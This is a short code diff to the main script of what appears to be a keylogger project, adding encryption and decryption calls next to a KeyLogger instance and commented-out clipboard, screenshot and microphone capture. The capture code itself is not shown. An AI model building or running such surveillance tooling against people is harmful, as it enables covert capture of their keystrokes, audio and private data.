@@ -1,6 +1,8 @@
 from keylogger.eavesdrop import copy_clipboard, microphone, screenshot
 
 from KeyLogger import KeyLogger
+from crypto.Encryption import Encryption
+from crypto.Decryption import Decryption
 
 
 def print_hello_world(name):
@@ -12,8 +14,10 @@ if __name__ == '__main__':
     # file_path = ""  # file path for files to be saved to
     # SystemInfoProvider().fetch_and_save_computer_information(file_path)
 
-    key_logger = KeyLogger(file_path=file_path)
+    KeyLogger(file_path=file_path)
     # copy_clipboard()
     # screenshot()
     # microphone()
+    Encryption(file_path=file_path)
+    Decryption(file_path=file_path)
     pass
